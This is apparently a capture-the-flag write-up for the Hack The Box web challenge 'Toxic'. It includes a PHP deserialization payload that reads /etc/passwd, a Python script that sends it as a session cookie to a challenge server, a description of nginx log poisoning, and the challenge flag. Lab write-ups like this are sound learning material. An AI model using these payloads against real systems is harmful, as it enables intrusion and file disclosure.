---
title: "Toxic - HackTheBox"
description: "https://app.hackthebox.com/challenges/Toxic"
summary: "Hack The Box Web Challenge Toxic"
date: 2024-01-24
draft: false
author: "Aftab Sama" # ["Me", "You"] # multiple authors
tags: ["Web", "HackTheBox", "Easy", "CTF"]
canonicalURL: ""
showToc: true
TocOpen: false
TocSide: 'right'  # or 'left'
# weight: 1
# aliases: ["/first"]
hidemeta: false
comments: false
disableHLJS: true # to disable highlightjs
disableShare: true
hideSummary: false
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
# UseHugoToc: true
---

------------------------

### Challenge Description

Humanity has exploited our allies, the dart frogs, for far too long, take back the freedom of our lovely poisonous friends. Malicious input is out of the question when dart frogs meet industrialisation. 🐸

### Insecure Deserialization

In the given source code we can spot that it is vulnerable to deserialization.

<img width="293" alt="image" src="/images/md/5fbcaee1-b10f-4765-93ef-7a4be1f4330b.webp">

`PageModel` have magic method `__destruct()` to exploite Deserialization.

<img width="206" alt="image" src="/images/md/1086d508-0033-4c6b-b6d4-3ec831a0bf87.webp">


payload= 
```
O:9:"PageModel":1:{s:4:"file";s:11:"/etc/passwd";}
```

```python
import requests
from itsdangerous import base64_encode

a = "PageModel"
b = "/etc/passwd"
payload = 'O:'+str(len(a))+':"'+a+'":1:{s:4:"file";s:'+str(len(b))+':"'+b+'";}'
payload = base64_encode(payload).decode()
r = requests.get("http://83.136.249.57:52345/",cookies={"PHPSESSID": payload},proxies={"http":"http://127.0.0.1:8080/"})
print(r.text)
```

The flag's name is random, so we need to find an alternative way to read it.

<img width="472" alt="image" src="/images/md/23c0c811-0290-4d90-bd9d-96b18d9c09ca.webp">

### PHP code Injection in log file

We can find the path of `/etc/nginx/nginx.conf` in Dockerfile.

<img width="317" alt="image" src="/images/md/f401a175-f86d-4ed6-9143-77d4b12e1817.webp">

Reading this file using the deserialization payload it reveals the path to access log `/var/log/nginx/access.log`.

<img width="320" alt="image" src="/images/md/76d581a6-12c0-4665-855b-3c5f1bb44d3f.webp">

By analyzing the access log, we can see that the User-agent is recorded in the log file.

<img width="571" alt="image" src="/images/md/d07a5788-7e8e-4667-b447-f4b5d8036053.webp">

We can attempt to insert PHP code into this log file and then read the file to determine whether the PHP code is executed.

<img width="185" alt="image" src="/images/md/a4b748d2-a890-4c19-bd1c-166ef783e385.webp">

<img width="491" alt="image" src="/images/md/d598a5ab-befc-4657-8b69-fde9f91c5230.webp">

and this works. Now we can use this PHP code injection to obtain the flag.

<img width="217" alt="image" src="/images/md/a0a677ec-ee03-460e-84c9-932dc009992f.webp">

<img width="361" alt="image" src="/images/md/e25196d7-00c7-4300-b002-11adf36413ff.webp">

Flag: `HTB{P0i5on_1n_Cyb3r_W4rF4R3?!}`


Happy Hacking
